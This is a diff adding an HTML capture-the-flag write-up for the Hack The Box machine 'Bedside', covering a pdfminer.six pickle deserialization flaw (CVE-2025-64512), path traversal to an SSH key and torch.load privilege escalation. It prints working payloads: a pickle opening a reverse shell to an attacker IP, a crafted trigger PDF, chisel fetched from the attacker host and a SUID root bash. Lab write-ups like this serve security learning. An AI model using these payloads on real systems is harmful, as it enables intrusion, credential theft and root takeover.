@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bedside — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>Bedside</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#9</span></div>
+            <div class="row"> Machine <span class="highlight">Bedside</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">pdfminer.six</span>] [<span class="highlight">CVE-2025-64512</span>] [<span class="highlight">torch.load</span>] [<span class="highlight">Pickle RCE</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <div class="callout info">
+            <strong>📌 Summary</strong>
+            Hospital clinic network. File upload portal processes PDFs with <code>pdfminer.six</code> (CVE-2025-64512 pickle RCE via <code>/Encoding</code>). Shell as <code>datawrangler</code> → developer SSH key → <code>sudo</code> MONAI trainer runs <code>torch.load()</code> with pickle (torch &lt;2.6) → root SUID bash.
+          </div>
+
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -oA nmap-result</code></pre>
+
+          <p><strong>Open Ports:</strong></p>
+          <ul>
+            <li><strong>22/tcp</strong> – SSH (OpenSSH 10.0p2 Debian)</li>
+            <li><strong>80/tcp</strong> – HTTP (Apache 2.4.68 → <code>bedside.htb</code>)</li>
+          </ul>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            Register hosts after vhost discovery:
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> bedside.htb research.bedside.htb' | sudo tee -a /etc/hosts</code></pre>
+          </div>
+
+          <pre><code>ffuf -w /usr/share/wordlists/seclists/DNS/subdomains-top1million-20000.txt \
+  -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -t 200 -fc 301</code></pre>
+
+          <p><code>research.bedside.htb</code> is a <strong>Medical Document Upload Portal</strong>. Headers expose the backend:</p>
+          <pre><code>curl -sI http://research.bedside.htb
+# X-Powered-By: pdfminer.six</code></pre>
+
+          <div class="callout warning">
+            <strong>⚠️ CVE-2025-64512</strong>
+            Unpatched <code>pdfminer.six</code> resolves a Type0 font <code>/Encoding</code> name as a filesystem path. Pointing it at a gzipped pickle triggers CMap deserialization RCE.
+          </div>
+
+          <h2>2. Exploitation</h2>
+          <h3>Pickle Payload + Trigger PDF</h3>
+          <p>Generate a gzipped pickle that spawns a reverse shell:</p>
+          <pre><code>import pickle, gzip, os
+class Evil:
+    def __reduce__(self):
+        cmd = "bash -c 'bash -i >& /dev/tcp/<span class="ph">&lt;attacker-ip&gt;</span>/4444 0>&1'"
+        return (os.system, (cmd,))
+with gzip.open("shell.pickle.gz", "wb") as f:
+    pickle.dump(Evil(), f)</code></pre>
+
+          <p>pdfminer.six resolves the <code>/Encoding</code> name as a filesystem path. The trigger PDF points to the gzipped pickle.</p>
+          <pre><code>#!/usr/bin/env python3
+
+def create_trigger_pdf(filename="trigger.pdf"):
+    pdf_content = """%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
+endobj
+4 0 obj
+<< /Length 44 >>
+stream
+BT /F1 24 Tf 100 700 Td (Trigger PDF) Tj ET
+endstream
+endobj
+5 0 obj
+<<
+/Type /Font
+/Subtype /Type0
+/BaseFont /MaliciousFont-Identity-H
+/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fshell
+/DescendantFonts [6 0 R]
+>>
+endobj
+6 0 obj
+<< /Type /Font /Subtype /CIDFontType0 /BaseFont /MaliciousFont-Identity-H /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> >>
+endobj
+xref
+0 7
+0000000000 65535 f
+0000000015 00000 n
+0000000063 00000 n
+0000000119 00000 n
+0000000202 00000 n
+0000000300 00000 n
+0000000450 00000 n
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+530
+%%EOF"""
+
+    with open(filename, 'w') as f:
+        f.write(pdf_content)
+    
+    print(f"[+] Created malicious PDF: {filename}")
+    print("[+] The PDF contains the malicious /Encoding field")
+    print("[+] Upload this PDF to trigger the exploit")
+
+if __name__ == "__main__":
+    create_trigger_pdf()</code></pre>
+
+          <pre><code>python3 make_pickle.py
+python3 trigger_pdf.py
+# PDF /Encoding uses #2F for / → /var/www/research.bedside.htb/uploads/shell</code></pre>
+
+          <pre><code>nc -lnvp 4444
+
+curl -s -F "uploadFile=@shell.pickle.gz" http://research.bedside.htb | grep -i message
+curl -s -F "uploadFile=@trigger.pdf" http://research.bedside.htb | grep -i message
+# ~30s later → shell as datawrangler</code></pre>
+
+          <h2>3. Post-exploitation</h2>
+          <h3>Container → Developer (LFI on :3000)</h3>
+          <pre><code>./tmp/portscan.sh 127.0.0.1
+# 22, 80, 3000</code></pre>
+
+          <p>Chisel forward of localhost:3000, then path traversal for the developer key:</p>
+          <pre><code># attacker
+./chisel server -p 8888 --reverse
+python3 -m http.server
+
+# target
+curl -o /tmp/chisel http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/chisel
+chmod +x /tmp/chisel
+./chisel client <span class="ph">&lt;attacker-ip&gt;</span>:8888 R:3000:127.0.0.1:3000
+
+curl -s --path-as-is "http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa"
+chmod 600 developer.key
+ssh -i developer.key developer@bedside.htb</code></pre>
+
+          <h3>Privilege Escalation — <code>torch.load</code> Pickle</h3>
+          <pre><code>sudo -l
+# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
+
+python3 -c "import torch; print(torch.__version__)"
+# 2.5.0+cpu  → weights_only=False by default</code></pre>
+
+          <p>Place a malicious checkpoint (from <code>datawrangler</code> context into <code>/datastore/checkpoints/</code>), then run the trainer as root:</p>
+          <pre><code>import torch, os
+class Evil:
+    def __reduce__(self):
+        return (os.system, (
+            "cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash",
+        ))
+torch.save({"model": Evil()}, "/tmp/checkpoint_epoch_999.pt")
+# copy into /datastore/checkpoints/
+
+sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+/var/tmp/rootbash -p
+cat /root/root.txt</code></pre>
+
+          <div class="callout info">
+            <strong>📌 torch &lt; 2.6</strong>
+            Before 2.6, <code>torch.load()</code> defaults to <code>weights_only=False</code> (arbitrary pickle). Always load untrusted checkpoints with <code>weights_only=True</code>.
+          </div>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/developer/user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            pdfminer’s CMap path resolution turned a “safe” PDF upload into pickle RCE (CVE-2025-64512). Internal services and LFI on :3000 exposed developer SSH keys. A sudo-wrapped ML trainer still calling <code>torch.load()</code> without <code>weights_only=True</code> completed the path to root. Patch pdfminer, isolate upload processors, and never deserialize untrusted model files as root.
+          </div>
+        </div>
+
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','python3','sudo','nmap','ssh','rustscan','ffuf','curl','nc','echo','cat','cd','chmod','bash','import','os','torch','chisel','gunzip','mv','grep','source'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
